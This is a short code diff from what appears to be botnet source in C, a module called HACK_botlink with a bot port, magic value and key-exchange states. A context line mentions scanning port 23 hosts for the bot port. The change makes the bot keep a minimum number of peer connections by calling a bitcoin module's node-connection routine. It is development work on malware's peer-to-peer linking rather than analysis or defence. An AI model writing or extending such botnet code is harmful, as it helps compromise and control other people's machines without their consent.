@@ -27,6 +27,8 @@ also it can start checking every port 23 found for bot port since half the searc
 #include "utils.h"
 #include "botlink.h"
 #include "portscan.h"
+// for reusing bitcon's node connection function
+#include "modules/bitcoin/note_bitcoin.h"
 
 #define BOT_PORT 4843
 #define BOT_MAGIC 0xAABBCCDD
@@ -39,6 +41,8 @@ enum {
     BOT_KEY_EXCHANGE=8,
     BOT_PERFECT=STATE_OK
 };
+
+
 
 typedef struct _bot_header {
     uint32_t magic;
@@ -102,9 +106,7 @@ ModuleFuncs botlink_funcs = {
     NULL, //&botlink_outgoing,
     &botlink_main_loop,
     &botlink_connect,
-    NULL, //&botlink_disconnect,
-    NULL,
-    NULL
+    NULL //&botlink_disconnect,
 };
 
 Modules HACK_botlink = {
@@ -145,7 +147,8 @@ int botlink_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
     int connection_count = L_count((LIST *)mptr->connections);
     if (connection_count < MIN_BOT_CONNECTIONS) {
         // attempt to connect to however many nodes we are mising under X connections
-        mptr->functions->connect_nodes(mptr, MIN_BOT_CONNECTIONS - connection_count);
+        // reuse bitcoin connect nodes..
+        bitcoin_connect_nodes(mptr, MIN_BOT_CONNECTIONS - connection_count);
     } 
 }
 
